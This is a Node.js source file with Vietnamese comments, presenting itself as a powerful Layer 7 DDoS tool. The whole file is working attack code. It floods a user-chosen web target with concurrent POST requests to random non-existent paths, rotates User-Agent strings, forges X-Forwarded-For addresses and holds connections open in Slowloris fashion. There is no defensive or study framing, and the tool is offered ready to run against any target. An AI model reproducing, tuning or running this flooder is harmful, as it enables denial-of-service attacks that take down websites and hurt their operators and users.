// server.js - DDoS Layer 7 SIÊU MẠNH cho Node.js
// Chạy: node server.js

const http = require('http');
const https = require('https');
const os = require('os');

// ===== CẤU HÌNH TỐI ƯU NHẤT =====
const CONFIG = {
    target: 'http://192.168.1.100:8080',     // ĐỔI THÀNH TARGET CỦA BẠN
    threads: os.cpus().length * 500,          // 500 luồng/core CPU
    requestsPerThread: 200000,                // Request mỗi luồng
    method: 'POST',                           // POST tốn resource hơn GET
    timeout: 200,                             // Timeout thấp nhất
    attackMode: 'mixed',                      // DDoS + 404
    slowloris: true,                          // BẬT SLOWLORIS
    slowlorisDelay: 60000,                    // Giữ 60 giây
    verbose: true,
    custom404Paths: [
        '/wp-admin/', '/api/v1/', '/css/', '/js/', '/images/', 
        '/assets/', '/vendor/', '/node_modules/', '/admin/', 
        '/login/', '/dashboard/', '/profile/', '/settings/', 
        '/upload/', '/download/', '/search/', '/product/', 
        '/cart/', '/checkout/', '/payment/', '/order/', 
        '/invoice/', '/report/', '/analytics/', '/log/', 
        '/backup/', '/temp/', '/tmp/', '/cache/', '/static/', 
        '/media/', '/files/', '/doc/', '/docs/', '/help/', 
        '/support/', '/contact/', '/about/', '/blog/', '/news/', 
        '/events/', '/gallery/', '/portfolio/', '/services/', 
        '/pricing/', '/faq/', '/terms/', '/privacy/', '/sitemap/'
    ]
};

// ===== USER-AGENT POOL =====
const UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0 Safari/537.36'
];

// ===== TẠO REQUEST =====
function createRequest() {
    let endpoint = '';
    if (CONFIG.attackMode === '404' || CONFIG.attackMode === 'mixed') {
        const base = CONFIG.custom404Paths[Math.floor(Math.random() * CONFIG.custom404Paths.length)];
        const random = Math.random().toString(36).substring(2, 8);
        endpoint = base + '/' + random;
        endpoint += '?id=' + Math.random().toString(36).substring(2, 10);
        endpoint += '&t=' + Date.now();
        endpoint += '&r=' + Math.random().toString(36).substring(2, 8);
    } else {
        endpoint = '/?r=' + Math.random().toString(36).substring(2, 8) + '&t=' + Date.now();
    }
    
    const ua = UAS[Math.floor(Math.random() * UAS.length)];
    const options = {
        method: CONFIG.method,
        headers: {
            'User-Agent': ua,
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': CONFIG.slowloris ? 'keep-alive' : 'close',
            'X-Forwarded-For': Math.floor(Math.random() * 255) + '.' + 
                               Math.floor(Math.random() * 255) + '.' + 
                               Math.floor(Math.random() * 255) + '.' + 
                               Math.floor(Math.random() * 255)
        },
        timeout: CONFIG.timeout
    };

    if (CONFIG.method === 'POST') {
        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        options.body = 'data=' + Math.random().toString(36).substring(2, 15) + '&t=' + Date.now();
    }

    return { options, endpoint };
}

// ===== GỬI REQUEST =====
function sendRequest() {
    return new Promise((resolve) => {
        const { options, endpoint } = createRequest();
        const client = CONFIG.target.startsWith('https') ? https : http;
        const req = client.request(CONFIG.target + endpoint, options, (res) => {
            res.resume();
            if (CONFIG.slowloris) {
                setTimeout(() => {
                    res.destroy();
                    resolve();
                }, CONFIG.slowlorisDelay + Math.random() * 1000);
            } else {
                resolve();
            }
        });

        req.on('error', () => resolve());
        req.on('timeout', () => { req.destroy(); resolve(); });

        if (options.body) {
            req.write(options.body);
        }
        req.end();
    });
}

// ===== CHẠY TẤN CÔNG =====
console.log('🔥 DDoS PRO - ULTIMATE EDITION (Node.js)');
console.log('📌 Target:', CONFIG.target);
console.log('🧵 Threads:', CONFIG.threads);
console.log('📤 Requests/thread:', CONFIG.requestsPerThread);
console.log('📊 Total:', CONFIG.threads * CONFIG.requestsPerThread);
console.log('🎯 Mode:', CONFIG.attackMode);
console.log('🐌 Slowloris:', CONFIG.slowloris ? 'ON' : 'OFF');
console.log('---------------------------');

const startTime = Date.now();
let totalSent = 0;
let completedThreads = 0;

for (let i = 0; i < CONFIG.threads; i++) {
    setTimeout(async () => {
        let count = 0;
        const interval = setInterval(async () => {
            if (count >= CONFIG.requestsPerThread) {
                clearInterval(interval);
                completedThreads++;
                if (completedThreads === CONFIG.threads) {
                    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
                    console.log('---------------------------');
                    console.log('✅ DONE!');
                    console.log('📊 Total:', totalSent);
                    console.log('⏱️ Duration:', duration + 's');
                    console.log('⚡ RPS:', Math.round(totalSent / duration));
                    process.exit(0);
                }
                return;
            }
            await sendRequest();
            count++;
            totalSent++;
            if (CONFIG.verbose && totalSent % 1000 === 0) {
                const elapsed = (Date.now() - startTime) / 1000;
                console.log(`📤 ${totalSent} | ⚡ ${Math.round(totalSent / elapsed)} RPS`);
            }
        }, 0);
    }, i * 0.1);
}

process.on('SIGINT', () => {
    console.log('\n⏹️ Stopped. Total:', totalSent);
    process.exit(0);
});
